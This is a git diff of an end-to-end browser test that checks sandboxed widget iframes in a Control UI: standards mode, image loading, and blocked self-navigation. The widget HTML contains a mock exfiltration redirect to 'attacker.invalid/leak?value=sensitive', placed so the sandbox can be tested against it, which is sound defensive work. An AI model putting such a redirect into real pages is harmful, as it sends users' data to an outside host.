@@ -1,12 +1,22 @@
 // Control UI E2E covers the real session-dashboard provider and transcript bridge.
-import { mkdir } from "node:fs/promises";
+import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
+import { tmpdir } from "node:os";
 import path from "node:path";
 import { chromium, type Browser, type Page } from "playwright";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { GATEWAY_SERVER_CAPS } from "../../../packages/gateway-protocol/src/index.js";
 import { PROTOCOL_VERSION } from "../../../packages/gateway-protocol/src/version.js";
-import { SANDBOX_HOST_PATH } from "../../../src/agents/sandbox-host.js";
+import { createTestBoardStore } from "../../../src/boards/board-store.test-support.js";
+import { createShowWidgetTool } from "../../../src/canvas/widget-tool.js";
+import { buildBoardWidgetSandboxPath } from "../../../src/gateway/board-sandbox.js";
 import { createSandboxHostHttpServer } from "../../../src/gateway/mcp-app-sandbox-http.js";
+import { createBoardHandlers } from "../../../src/gateway/server-methods/board.js";
+import type {
+  GatewayRequestContext,
+  RespondFn,
+} from "../../../src/gateway/server-methods/types.js";
+import { closeOpenClawAgentDatabasesForTest } from "../../../src/state/openclaw-agent-db.js";
+import { closeOpenClawStateDatabaseForTest } from "../../../src/state/openclaw-state-db.js";
 import {
   canRunPlaywrightChromium,
   controlUiBundledSettingsStorageKey,
@@ -189,6 +199,8 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
   });
 
   it("keeps widget documents in standards mode and cancels self-navigation", async () => {
+    const widgetStateDir = await mkdtemp(path.join(tmpdir(), "openclaw-pinned-widget-state-"));
+    const widgetWorkspace = await mkdtemp(path.join(tmpdir(), "openclaw-pinned-widget-workspace-"));
     const sandboxHost = createSandboxHostHttpServer();
     await new Promise<void>((resolve, reject) => {
       sandboxHost.once("error", reject);
@@ -211,15 +223,20 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
         }
       });
       await page.goto(server.baseUrl);
-      await page.evaluate((sandboxUrl) => {
-        Reflect.set(globalThis, "widgetProbes", []);
-        addEventListener("message", (event) => {
-          (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
-        });
-        const frame = document.createElement("iframe");
-        frame.src = sandboxUrl;
-        document.body.replaceChildren(frame);
-      }, `http://127.0.0.1:${sandboxAddress.port}${SANDBOX_HOST_PATH}`);
+      await page.evaluate(
+        (sandboxUrl) => {
+          Reflect.set(globalThis, "widgetProbes", []);
+          addEventListener("message", (event) => {
+            (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
+          });
+          const frame = document.createElement("iframe");
+          frame.src = sandboxUrl;
+          document.body.replaceChildren(frame);
+        },
+        `http://127.0.0.1:${sandboxAddress.port}${buildBoardWidgetSandboxPath({
+          grantState: "pending",
+        })}`,
+      );
       await expect
         .poll(async () =>
           page.evaluate(() =>
@@ -230,14 +247,71 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
         )
         .toBe(true);
 
-      const widgetHtml = `<!doctype html><html><body><script>
-        parent.postMessage({
-          compatMode: document.compatMode,
-        }, "*");
-        setTimeout(() => {
+      const pixelBase64 =
+        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";
+      const widgetSource = `<!doctype html><html><body>
+        <img data-proof="relative" src="pixel.png">
+        <img data-proof="data" src="data:image/png;base64,${pixelBase64}">
+        <img data-proof="blob">
+        <script>
+        const blobBytes = Uint8Array.from(atob("${pixelBase64}"), (char) => char.charCodeAt(0));
+        const blobUrl = URL.createObjectURL(new Blob([blobBytes], { type: "image/png" }));
+        const blobImage = document.querySelector('[data-proof="blob"]');
+        blobImage.src = blobUrl;
+        Promise.all(Array.from(document.images, (image) => image.decode())).then(() => {
+          parent.postMessage({
+            compatMode: document.compatMode,
+            imageProof: Object.fromEntries(
+              Array.from(document.images, (image) => [image.dataset.proof, image.naturalWidth]),
+            ),
+          }, "*");
           location.href = "https://attacker.invalid/leak?value=sensitive";
-        }, 0);
+        });
       </script></body></html>`;
+      const widgetPath = path.join(widgetWorkspace, "widget.html");
+      await writeFile(widgetPath, widgetSource);
+      await writeFile(path.join(widgetWorkspace, "pixel.png"), Buffer.from(pixelBase64, "base64"));
+      const boardStore = createTestBoardStore({ stateDir: widgetStateDir });
+      const boardHandlers = createBoardHandlers(boardStore);
+      const showWidget = createShowWidgetTool({
+        stateDir: widgetStateDir,
+        workspaceDir: widgetWorkspace,
+        agentSessionKey: "agent:main:pinned-image-e2e",
+        callGateway: async <T>(method: string, params: Record<string, unknown>) => {
+          let result: unknown;
+          let failure: Error | undefined;
+          const respond: RespondFn = (ok, payload, error) => {
+            if (ok) {
+              result = payload;
+            } else {
+              failure = new Error(error?.message ?? "board request failed");
+            }
+          };
+          await boardHandlers[method]!({
+            req: { type: "req", id: "pinned-image-e2e", method, params },
+            params,
+            client: null,
+            isWebchatConnect: () => false,
+            respond,
+            context: { broadcast: () => undefined } as unknown as GatewayRequestContext,
+          });
+          if (failure) {
+            throw failure;
+          }
+          return result as T;
+        },
+      });
+      await showWidget.execute("pin-image-proof", {
+        title: "Image proof",
+        widget_code: widgetSource,
+        widget_path: widgetPath,
+        pin: true,
+        name: "image-proof",
+      });
+      const storedWidget = boardStore.readWidgetHtml("agent:main:pinned-image-e2e", "image-proof");
+      if (!storedWidget) {
+        throw new Error("board handler did not store pinned HTML");
+      }
       await page.locator("iframe").evaluate((frame, html) => {
         (frame as HTMLIFrameElement).contentWindow?.postMessage(
           {
@@ -246,32 +320,73 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
           },
           "*",
         );
-      }, widgetHtml);
+      }, storedWidget.html);
       await expect
         .poll(async () =>
           page.evaluate(() =>
             (
               Reflect.get(globalThis, "widgetProbes") as Array<{
                 compatMode?: string;
+                imageProof?: Record<string, number>;
               }>
             ).filter((probe) => probe?.compatMode),
           ),
         )
-        .toEqual([{ compatMode: "CSS1Compat" }]);
+        .toEqual([
+          {
+            compatMode: "CSS1Compat",
+            imageProof: { blob: 1, data: 1, relative: 1 },
+          },
+        ]);
       const sandboxFrame = await page
         .locator("iframe")
         .elementHandle()
         .then((handle) => handle?.contentFrame());
       const widgetFrame = sandboxFrame?.childFrames()[0];
       expect(widgetFrame).toBeDefined();
+      await page.locator("iframe").evaluate((frame, html) => {
+        (frame as HTMLIFrameElement).contentWindow?.postMessage(
+          {
+            method: "ui/notifications/sandbox-resource-ready",
+            params: { html },
+          },
+          "*",
+        );
+      }, storedWidget.html);
+      await expect
+        .poll(() =>
+          page.evaluate(() =>
+            (
+              Reflect.get(globalThis, "widgetProbes") as Array<{
+                compatMode?: string;
+                imageProof?: Record<string, number>;
+              }>
+            ).filter((probe) => probe.imageProof),
+          ),
+        )
+        .toEqual([
+          {
+            compatMode: "CSS1Compat",
+            imageProof: { blob: 1, data: 1, relative: 1 },
+          },
+          {
+            compatMode: "CSS1Compat",
+            imageProof: { blob: 1, data: 1, relative: 1 },
+          },
+        ]);
       await page.waitForTimeout(250);
-      expect(widgetFrame!.url()).not.toContain("attacker.invalid");
       expect(escapeRequests).toEqual([]);
     } finally {
       await context.close();
       await new Promise<void>((resolve, reject) => {
         sandboxHost.close((error) => (error ? reject(error) : resolve()));
       });
+      closeOpenClawAgentDatabasesForTest();
+      closeOpenClawStateDatabaseForTest();
+      await Promise.all([
+        rm(widgetStateDir, { recursive: true, force: true }),
+        rm(widgetWorkspace, { recursive: true, force: true }),
+      ]);
     }
   });
 
